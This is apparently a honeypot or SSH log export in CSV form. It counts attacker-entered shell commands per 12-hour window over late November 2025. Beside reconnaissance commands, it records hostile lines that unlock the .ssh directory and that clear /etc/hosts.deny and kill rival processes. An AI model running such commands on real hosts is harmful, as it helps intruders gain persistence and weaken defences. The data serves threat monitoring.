@@ -1,0 +1,2466 @@
+﻿Top 10000 values of input.keyword,@timestamp per 12 hours,Count of records
+cd ~; chattr -ia .ssh; lockr -ia .ssh,15/11/2025 00:00,38
+cd ~; chattr -ia .ssh; lockr -ia .ssh,15/11/2025 12:00,73
+cd ~; chattr -ia .ssh; lockr -ia .ssh,16/11/2025 00:00,22
+cd ~; chattr -ia .ssh; lockr -ia .ssh,17/11/2025 00:00,5
+cd ~; chattr -ia .ssh; lockr -ia .ssh,17/11/2025 12:00,38
+cd ~; chattr -ia .ssh; lockr -ia .ssh,18/11/2025 00:00,38
+cd ~; chattr -ia .ssh; lockr -ia .ssh,18/11/2025 12:00,2
+cd ~; chattr -ia .ssh; lockr -ia .ssh,19/11/2025 00:00,91
+cd ~; chattr -ia .ssh; lockr -ia .ssh,19/11/2025 12:00,8
+cd ~; chattr -ia .ssh; lockr -ia .ssh,20/11/2025 00:00,114
+cd ~; chattr -ia .ssh; lockr -ia .ssh,20/11/2025 12:00,13
+cd ~; chattr -ia .ssh; lockr -ia .ssh,21/11/2025 00:00,78
+cd ~; chattr -ia .ssh; lockr -ia .ssh,21/11/2025 12:00,7
+cd ~; chattr -ia .ssh; lockr -ia .ssh,22/11/2025 00:00,110
+cd ~; chattr -ia .ssh; lockr -ia .ssh,22/11/2025 12:00,39
+cd ~; chattr -ia .ssh; lockr -ia .ssh,23/11/2025 00:00,151
+cd ~; chattr -ia .ssh; lockr -ia .ssh,24/11/2025 00:00,46
+cd ~; chattr -ia .ssh; lockr -ia .ssh,25/11/2025 00:00,50
+cd ~; chattr -ia .ssh; lockr -ia .ssh,25/11/2025 12:00,88
+cd ~; chattr -ia .ssh; lockr -ia .ssh,26/11/2025 00:00,29
+cd ~; chattr -ia .ssh; lockr -ia .ssh,26/11/2025 12:00,3
+cd ~; chattr -ia .ssh; lockr -ia .ssh,27/11/2025 00:00,29
+cd ~; chattr -ia .ssh; lockr -ia .ssh,28/11/2025 00:00,8
+cd ~; chattr -ia .ssh; lockr -ia .ssh,28/11/2025 12:00,52
+cd ~; chattr -ia .ssh; lockr -ia .ssh,29/11/2025 00:00,26
+cd ~; chattr -ia .ssh; lockr -ia .ssh,29/11/2025 12:00,27
+cd ~; chattr -ia .ssh; lockr -ia .ssh,30/11/2025 00:00,91
+cd ~; chattr -ia .ssh; lockr -ia .ssh,30/11/2025 12:00,5
+cat /proc/cpuinfo | grep name | wc -l,15/11/2025 00:00,38
+cat /proc/cpuinfo | grep name | wc -l,15/11/2025 12:00,73
+cat /proc/cpuinfo | grep name | wc -l,16/11/2025 00:00,22
+cat /proc/cpuinfo | grep name | wc -l,17/11/2025 00:00,5
+cat /proc/cpuinfo | grep name | wc -l,17/11/2025 12:00,31
+cat /proc/cpuinfo | grep name | wc -l,18/11/2025 00:00,38
+cat /proc/cpuinfo | grep name | wc -l,18/11/2025 12:00,1
+cat /proc/cpuinfo | grep name | wc -l,19/11/2025 00:00,88
+cat /proc/cpuinfo | grep name | wc -l,19/11/2025 12:00,6
+cat /proc/cpuinfo | grep name | wc -l,20/11/2025 00:00,112
+cat /proc/cpuinfo | grep name | wc -l,20/11/2025 12:00,13
+cat /proc/cpuinfo | grep name | wc -l,21/11/2025 00:00,75
+cat /proc/cpuinfo | grep name | wc -l,21/11/2025 12:00,6
+cat /proc/cpuinfo | grep name | wc -l,22/11/2025 00:00,106
+cat /proc/cpuinfo | grep name | wc -l,22/11/2025 12:00,40
+cat /proc/cpuinfo | grep name | wc -l,23/11/2025 00:00,100
+cat /proc/cpuinfo | grep name | wc -l,24/11/2025 00:00,44
+cat /proc/cpuinfo | grep name | wc -l,25/11/2025 00:00,42
+cat /proc/cpuinfo | grep name | wc -l,25/11/2025 12:00,88
+cat /proc/cpuinfo | grep name | wc -l,26/11/2025 00:00,28
+cat /proc/cpuinfo | grep name | wc -l,26/11/2025 12:00,3
+cat /proc/cpuinfo | grep name | wc -l,27/11/2025 00:00,27
+cat /proc/cpuinfo | grep name | wc -l,28/11/2025 00:00,5
+cat /proc/cpuinfo | grep name | wc -l,28/11/2025 12:00,34
+cat /proc/cpuinfo | grep name | wc -l,29/11/2025 00:00,24
+cat /proc/cpuinfo | grep name | wc -l,29/11/2025 12:00,27
+cat /proc/cpuinfo | grep name | wc -l,30/11/2025 00:00,75
+cat /proc/cpuinfo | grep name | wc -l,30/11/2025 12:00,5
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",15/11/2025 00:00,38
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",15/11/2025 12:00,70
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",16/11/2025 00:00,22
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",17/11/2025 00:00,5
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",17/11/2025 12:00,31
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",18/11/2025 00:00,37
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",18/11/2025 12:00,1
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",19/11/2025 00:00,86
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",19/11/2025 12:00,6
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",20/11/2025 00:00,111
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",20/11/2025 12:00,11
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",21/11/2025 00:00,73
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",21/11/2025 12:00,6
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",22/11/2025 00:00,103
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",22/11/2025 12:00,40
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",23/11/2025 00:00,98
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",24/11/2025 00:00,44
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",25/11/2025 00:00,41
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",25/11/2025 12:00,85
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",26/11/2025 00:00,25
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",26/11/2025 12:00,2
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",27/11/2025 00:00,26
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",28/11/2025 00:00,4
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",28/11/2025 12:00,34
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",29/11/2025 00:00,24
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",29/11/2025 12:00,26
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",30/11/2025 00:00,73
+"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",30/11/2025 12:00,4
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",15/11/2025 00:00,38
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",15/11/2025 12:00,67
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",16/11/2025 00:00,22
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",17/11/2025 00:00,5
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",17/11/2025 12:00,31
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",18/11/2025 00:00,37
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",18/11/2025 12:00,1
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",19/11/2025 00:00,85
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",19/11/2025 12:00,6
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",20/11/2025 00:00,110
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",20/11/2025 12:00,11
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",21/11/2025 00:00,74
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",21/11/2025 12:00,5
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",22/11/2025 00:00,103
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",22/11/2025 12:00,40
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",23/11/2025 00:00,98
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",24/11/2025 00:00,44
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",25/11/2025 00:00,41
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",25/11/2025 12:00,87
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",26/11/2025 00:00,25
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",26/11/2025 12:00,2
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",27/11/2025 00:00,26
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",28/11/2025 00:00,4
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",28/11/2025 12:00,34
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",29/11/2025 00:00,24
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",29/11/2025 12:00,26
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",30/11/2025 00:00,72
+"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",30/11/2025 12:00,5
+uname -a,15/11/2025 00:00,40
+uname -a,15/11/2025 12:00,68
+uname -a,16/11/2025 00:00,22
+uname -a,17/11/2025 00:00,5
+uname -a,17/11/2025 12:00,32
+uname -a,18/11/2025 00:00,36
+uname -a,18/11/2025 12:00,1
+uname -a,19/11/2025 00:00,86
+uname -a,19/11/2025 12:00,6
+uname -a,20/11/2025 00:00,114
+uname -a,20/11/2025 12:00,10
+uname -a,21/11/2025 00:00,72
+uname -a,21/11/2025 12:00,7
+uname -a,22/11/2025 00:00,100
+uname -a,22/11/2025 12:00,38
+uname -a,23/11/2025 00:00,95
+uname -a,24/11/2025 00:00,45
+uname -a,25/11/2025 00:00,41
+uname -a,25/11/2025 12:00,84
+uname -a,26/11/2025 00:00,25
+uname -a,26/11/2025 12:00,2
+uname -a,27/11/2025 00:00,25
+uname -a,28/11/2025 00:00,5
+uname -a,28/11/2025 12:00,33
+uname -a,29/11/2025 00:00,23
+uname -a,29/11/2025 12:00,27
+uname -a,30/11/2025 00:00,75
+uname -a,30/11/2025 12:00,4
+w,15/11/2025 00:00,38
+w,15/11/2025 12:00,67
+w,16/11/2025 00:00,22
+w,17/11/2025 00:00,5
+w,17/11/2025 12:00,31
+w,18/11/2025 00:00,37
+w,18/11/2025 12:00,1
+w,19/11/2025 00:00,86
+w,19/11/2025 12:00,6
+w,20/11/2025 00:00,110
+w,20/11/2025 12:00,10
+w,21/11/2025 00:00,72
+w,21/11/2025 12:00,5
+w,22/11/2025 00:00,104
+w,22/11/2025 12:00,39
+w,23/11/2025 00:00,98
+w,24/11/2025 00:00,44
+w,25/11/2025 00:00,41
+w,25/11/2025 12:00,86
+w,26/11/2025 00:00,26
+w,26/11/2025 12:00,2
+w,27/11/2025 00:00,24
+w,28/11/2025 00:00,4
+w,28/11/2025 12:00,34
+w,29/11/2025 00:00,23
+w,29/11/2025 12:00,26
+w,30/11/2025 00:00,71
+w,30/11/2025 12:00,3
+crontab -l,15/11/2025 00:00,38
+crontab -l,15/11/2025 12:00,65
+crontab -l,16/11/2025 00:00,22
+crontab -l,17/11/2025 00:00,5
+crontab -l,17/11/2025 12:00,31
+crontab -l,18/11/2025 00:00,38
+crontab -l,18/11/2025 12:00,1
+crontab -l,19/11/2025 00:00,85
+crontab -l,19/11/2025 12:00,6
+crontab -l,20/11/2025 00:00,111
+crontab -l,20/11/2025 12:00,9
+crontab -l,21/11/2025 00:00,73
+crontab -l,21/11/2025 12:00,5
+crontab -l,22/11/2025 00:00,104
+crontab -l,22/11/2025 12:00,39
+crontab -l,23/11/2025 00:00,98
+crontab -l,24/11/2025 00:00,44
+crontab -l,25/11/2025 00:00,41
+crontab -l,25/11/2025 12:00,85
+crontab -l,26/11/2025 00:00,25
+crontab -l,26/11/2025 12:00,2
+crontab -l,27/11/2025 00:00,24
+crontab -l,28/11/2025 00:00,4
+crontab -l,28/11/2025 12:00,34
+crontab -l,29/11/2025 00:00,23
+crontab -l,29/11/2025 12:00,26
+crontab -l,30/11/2025 00:00,71
+crontab -l,30/11/2025 12:00,3
+ls -lh $(which ls),15/11/2025 00:00,38
+ls -lh $(which ls),15/11/2025 12:00,67
+ls -lh $(which ls),16/11/2025 00:00,22
+ls -lh $(which ls),17/11/2025 00:00,5
+ls -lh $(which ls),17/11/2025 12:00,31
+ls -lh $(which ls),18/11/2025 00:00,37
+ls -lh $(which ls),18/11/2025 12:00,1
+ls -lh $(which ls),19/11/2025 00:00,84
+ls -lh $(which ls),19/11/2025 12:00,5
+ls -lh $(which ls),20/11/2025 00:00,110
+ls -lh $(which ls),20/11/2025 12:00,11
+ls -lh $(which ls),21/11/2025 00:00,73
+ls -lh $(which ls),21/11/2025 12:00,5
+ls -lh $(which ls),22/11/2025 00:00,103
+ls -lh $(which ls),22/11/2025 12:00,40
+ls -lh $(which ls),23/11/2025 00:00,98
+ls -lh $(which ls),24/11/2025 00:00,44
+ls -lh $(which ls),25/11/2025 00:00,41
+ls -lh $(which ls),25/11/2025 12:00,85
+ls -lh $(which ls),26/11/2025 00:00,25
+ls -lh $(which ls),26/11/2025 12:00,2
+ls -lh $(which ls),27/11/2025 00:00,24
+ls -lh $(which ls),28/11/2025 00:00,4
+ls -lh $(which ls),28/11/2025 12:00,34
+ls -lh $(which ls),29/11/2025 00:00,23
+ls -lh $(which ls),29/11/2025 12:00,26
+ls -lh $(which ls),30/11/2025 00:00,70
+ls -lh $(which ls),30/11/2025 12:00,3
+uname -m,15/11/2025 00:00,38
+uname -m,15/11/2025 12:00,66
+uname -m,16/11/2025 00:00,22
+uname -m,17/11/2025 00:00,5
+uname -m,17/11/2025 12:00,31
+uname -m,18/11/2025 00:00,37
+uname -m,18/11/2025 12:00,1
+uname -m,19/11/2025 00:00,86
+uname -m,19/11/2025 12:00,6
+uname -m,20/11/2025 00:00,111
+uname -m,20/11/2025 12:00,10
+uname -m,21/11/2025 00:00,72
+uname -m,21/11/2025 12:00,5
+uname -m,22/11/2025 00:00,102
+uname -m,22/11/2025 12:00,39
+uname -m,23/11/2025 00:00,96
+uname -m,24/11/2025 00:00,44
+uname -m,25/11/2025 00:00,41
+uname -m,25/11/2025 12:00,85
+uname -m,26/11/2025 00:00,26
+uname -m,26/11/2025 12:00,2
+uname -m,27/11/2025 00:00,25
+uname -m,28/11/2025 00:00,4
+uname -m,28/11/2025 12:00,34
+uname -m,29/11/2025 00:00,23
+uname -m,29/11/2025 12:00,25
+uname -m,30/11/2025 00:00,72
+uname -m,30/11/2025 12:00,3
+which ls,15/11/2025 00:00,38
+which ls,15/11/2025 12:00,67
+which ls,16/11/2025 00:00,22
+which ls,17/11/2025 00:00,5
+which ls,17/11/2025 12:00,31
+which ls,18/11/2025 00:00,37
+which ls,18/11/2025 12:00,1
+which ls,19/11/2025 00:00,84
+which ls,19/11/2025 12:00,5
+which ls,20/11/2025 00:00,110
+which ls,20/11/2025 12:00,11
+which ls,21/11/2025 00:00,73
+which ls,21/11/2025 12:00,5
+which ls,22/11/2025 00:00,103
+which ls,22/11/2025 12:00,40
+which ls,23/11/2025 00:00,98
+which ls,24/11/2025 00:00,44
+which ls,25/11/2025 00:00,41
+which ls,25/11/2025 12:00,85
+which ls,26/11/2025 00:00,25
+which ls,26/11/2025 12:00,2
+which ls,27/11/2025 00:00,24
+which ls,28/11/2025 00:00,4
+which ls,28/11/2025 12:00,34
+which ls,29/11/2025 00:00,23
+which ls,29/11/2025 12:00,26
+which ls,30/11/2025 00:00,70
+which ls,30/11/2025 12:00,3
+cat /proc/cpuinfo | grep model | grep name | wc -l,15/11/2025 00:00,38
+cat /proc/cpuinfo | grep model | grep name | wc -l,15/11/2025 12:00,66
+cat /proc/cpuinfo | grep model | grep name | wc -l,16/11/2025 00:00,22
+cat /proc/cpuinfo | grep model | grep name | wc -l,17/11/2025 00:00,5
+cat /proc/cpuinfo | grep model | grep name | wc -l,17/11/2025 12:00,30
+cat /proc/cpuinfo | grep model | grep name | wc -l,18/11/2025 00:00,36
+cat /proc/cpuinfo | grep model | grep name | wc -l,18/11/2025 12:00,1
+cat /proc/cpuinfo | grep model | grep name | wc -l,19/11/2025 00:00,86
+cat /proc/cpuinfo | grep model | grep name | wc -l,19/11/2025 12:00,6
+cat /proc/cpuinfo | grep model | grep name | wc -l,20/11/2025 00:00,111
+cat /proc/cpuinfo | grep model | grep name | wc -l,20/11/2025 12:00,10
+cat /proc/cpuinfo | grep model | grep name | wc -l,21/11/2025 00:00,72
+cat /proc/cpuinfo | grep model | grep name | wc -l,21/11/2025 12:00,5
+cat /proc/cpuinfo | grep model | grep name | wc -l,22/11/2025 00:00,101
+cat /proc/cpuinfo | grep model | grep name | wc -l,22/11/2025 12:00,39
+cat /proc/cpuinfo | grep model | grep name | wc -l,23/11/2025 00:00,97
+cat /proc/cpuinfo | grep model | grep name | wc -l,24/11/2025 00:00,44
+cat /proc/cpuinfo | grep model | grep name | wc -l,25/11/2025 00:00,40
+cat /proc/cpuinfo | grep model | grep name | wc -l,25/11/2025 12:00,86
+cat /proc/cpuinfo | grep model | grep name | wc -l,26/11/2025 00:00,26
+cat /proc/cpuinfo | grep model | grep name | wc -l,26/11/2025 12:00,2
+cat /proc/cpuinfo | grep model | grep name | wc -l,27/11/2025 00:00,25
+cat /proc/cpuinfo | grep model | grep name | wc -l,28/11/2025 00:00,4
+cat /proc/cpuinfo | grep model | grep name | wc -l,28/11/2025 12:00,34
+cat /proc/cpuinfo | grep model | grep name | wc -l,29/11/2025 00:00,23
+cat /proc/cpuinfo | grep model | grep name | wc -l,29/11/2025 12:00,24
+cat /proc/cpuinfo | grep model | grep name | wc -l,30/11/2025 00:00,71
+cat /proc/cpuinfo | grep model | grep name | wc -l,30/11/2025 12:00,4
+top,15/11/2025 00:00,38
+top,15/11/2025 12:00,67
+top,16/11/2025 00:00,22
+top,17/11/2025 00:00,5
+top,17/11/2025 12:00,30
+top,18/11/2025 00:00,37
+top,18/11/2025 12:00,1
+top,19/11/2025 00:00,85
+top,19/11/2025 12:00,6
+top,20/11/2025 00:00,111
+top,20/11/2025 12:00,10
+top,21/11/2025 00:00,71
+top,21/11/2025 12:00,5
+top,22/11/2025 00:00,101
+top,22/11/2025 12:00,38
+top,23/11/2025 00:00,97
+top,24/11/2025 00:00,43
+top,25/11/2025 00:00,41
+top,25/11/2025 12:00,85
+top,26/11/2025 00:00,26
+top,26/11/2025 12:00,2
+top,27/11/2025 00:00,25
+top,28/11/2025 00:00,4
+top,28/11/2025 12:00,34
+top,29/11/2025 00:00,23
+top,29/11/2025 12:00,25
+top,30/11/2025 00:00,72
+top,30/11/2025 12:00,4
+whoami,15/11/2025 00:00,38
+whoami,15/11/2025 12:00,66
+whoami,16/11/2025 00:00,22
+whoami,17/11/2025 00:00,5
+whoami,17/11/2025 12:00,30
+whoami,18/11/2025 00:00,36
+whoami,18/11/2025 12:00,1
+whoami,19/11/2025 00:00,86
+whoami,19/11/2025 12:00,6
+whoami,20/11/2025 00:00,111
+whoami,20/11/2025 12:00,10
+whoami,21/11/2025 00:00,72
+whoami,21/11/2025 12:00,6
+whoami,22/11/2025 00:00,101
+whoami,22/11/2025 12:00,37
+whoami,23/11/2025 00:00,93
+whoami,24/11/2025 00:00,45
+whoami,25/11/2025 00:00,42
+whoami,25/11/2025 12:00,83
+whoami,26/11/2025 00:00,25
+whoami,26/11/2025 12:00,2
+whoami,27/11/2025 00:00,26
+whoami,28/11/2025 00:00,5
+whoami,28/11/2025 12:00,33
+whoami,29/11/2025 00:00,23
+whoami,29/11/2025 12:00,25
+whoami,30/11/2025 00:00,73
+whoami,30/11/2025 12:00,4
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',15/11/2025 00:00,38
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',15/11/2025 12:00,67
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',16/11/2025 00:00,22
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',17/11/2025 00:00,5
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',17/11/2025 12:00,30
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',18/11/2025 00:00,36
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',18/11/2025 12:00,1
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',19/11/2025 00:00,86
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',19/11/2025 12:00,5
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',20/11/2025 00:00,110
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',20/11/2025 12:00,11
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',21/11/2025 00:00,72
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',21/11/2025 12:00,6
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',22/11/2025 00:00,101
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',22/11/2025 12:00,38
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',23/11/2025 00:00,94
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',24/11/2025 00:00,44
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',25/11/2025 00:00,41
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',25/11/2025 12:00,84
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',26/11/2025 00:00,25
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',26/11/2025 12:00,2
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',27/11/2025 00:00,26
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',28/11/2025 00:00,5
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',28/11/2025 12:00,33
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',29/11/2025 00:00,23
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',29/11/2025 12:00,25
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',30/11/2025 00:00,72
+df -h | head -n 2 | awk 'FNR == 2 {print $2;}',30/11/2025 12:00,3
+uname,15/11/2025 00:00,38
+uname,15/11/2025 12:00,68
+uname,16/11/2025 00:00,22
+uname,17/11/2025 00:00,5
+uname,17/11/2025 12:00,30
+uname,18/11/2025 00:00,37
+uname,18/11/2025 12:00,1
+uname,19/11/2025 00:00,86
+uname,19/11/2025 12:00,6
+uname,20/11/2025 00:00,111
+uname,20/11/2025 12:00,10
+uname,21/11/2025 00:00,71
+uname,21/11/2025 12:00,5
+uname,22/11/2025 00:00,100
+uname,22/11/2025 12:00,38
+uname,23/11/2025 00:00,95
+uname,24/11/2025 00:00,44
+uname,25/11/2025 00:00,41
+uname,25/11/2025 12:00,84
+uname,26/11/2025 00:00,25
+uname,26/11/2025 12:00,2
+uname,27/11/2025 00:00,25
+uname,28/11/2025 00:00,4
+uname,28/11/2025 12:00,33
+uname,29/11/2025 00:00,23
+uname,29/11/2025 12:00,25
+uname,30/11/2025 00:00,73
+uname,30/11/2025 12:00,3
+lscpu | grep Model,15/11/2025 00:00,38
+lscpu | grep Model,15/11/2025 12:00,67
+lscpu | grep Model,16/11/2025 00:00,22
+lscpu | grep Model,17/11/2025 00:00,5
+lscpu | grep Model,17/11/2025 12:00,30
+lscpu | grep Model,18/11/2025 00:00,36
+lscpu | grep Model,18/11/2025 12:00,1
+lscpu | grep Model,19/11/2025 00:00,86
+lscpu | grep Model,19/11/2025 12:00,5
+lscpu | grep Model,20/11/2025 00:00,111
+lscpu | grep Model,20/11/2025 12:00,11
+lscpu | grep Model,21/11/2025 00:00,72
+lscpu | grep Model,21/11/2025 12:00,6
+lscpu | grep Model,22/11/2025 00:00,99
+lscpu | grep Model,22/11/2025 12:00,38
+lscpu | grep Model,23/11/2025 00:00,94
+lscpu | grep Model,24/11/2025 00:00,44
+lscpu | grep Model,25/11/2025 00:00,41
+lscpu | grep Model,25/11/2025 12:00,82
+lscpu | grep Model,26/11/2025 00:00,25
+lscpu | grep Model,26/11/2025 12:00,2
+lscpu | grep Model,27/11/2025 00:00,26
+lscpu | grep Model,28/11/2025 00:00,5
+lscpu | grep Model,28/11/2025 12:00,33
+lscpu | grep Model,29/11/2025 00:00,23
+lscpu | grep Model,29/11/2025 12:00,25
+lscpu | grep Model,30/11/2025 00:00,72
+lscpu | grep Model,30/11/2025 12:00,4
+Enter new UNIX password: ,15/11/2025 00:00,20
+Enter new UNIX password: ,15/11/2025 12:00,25
+Enter new UNIX password: ,16/11/2025 00:00,8
+Enter new UNIX password: ,17/11/2025 00:00,5
+Enter new UNIX password: ,17/11/2025 12:00,21
+Enter new UNIX password: ,18/11/2025 00:00,20
+Enter new UNIX password: ,19/11/2025 00:00,39
+Enter new UNIX password: ,19/11/2025 12:00,4
+Enter new UNIX password: ,20/11/2025 00:00,53
+Enter new UNIX password: ,20/11/2025 12:00,6
+Enter new UNIX password: ,21/11/2025 00:00,30
+Enter new UNIX password: ,21/11/2025 12:00,2
+Enter new UNIX password: ,22/11/2025 00:00,62
+Enter new UNIX password: ,22/11/2025 12:00,14
+Enter new UNIX password: ,23/11/2025 00:00,55
+Enter new UNIX password: ,24/11/2025 00:00,34
+Enter new UNIX password: ,25/11/2025 00:00,32
+Enter new UNIX password: ,25/11/2025 12:00,58
+Enter new UNIX password: ,26/11/2025 00:00,15
+Enter new UNIX password: ,26/11/2025 12:00,1
+Enter new UNIX password: ,27/11/2025 00:00,15
+Enter new UNIX password: ,28/11/2025 00:00,4
+Enter new UNIX password: ,28/11/2025 12:00,33
+Enter new UNIX password: ,29/11/2025 00:00,11
+Enter new UNIX password: ,29/11/2025 12:00,21
+Enter new UNIX password: ,30/11/2025 00:00,48
+Enter new UNIX password: ,30/11/2025 12:00,4
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,15/11/2025 00:00,18
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,15/11/2025 12:00,46
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,16/11/2025 00:00,14
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,17/11/2025 12:00,10
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,18/11/2025 00:00,17
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,18/11/2025 12:00,1
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,19/11/2025 00:00,48
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,19/11/2025 12:00,2
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,20/11/2025 00:00,58
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,20/11/2025 12:00,6
+rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;,21/11/2025 00:00,45
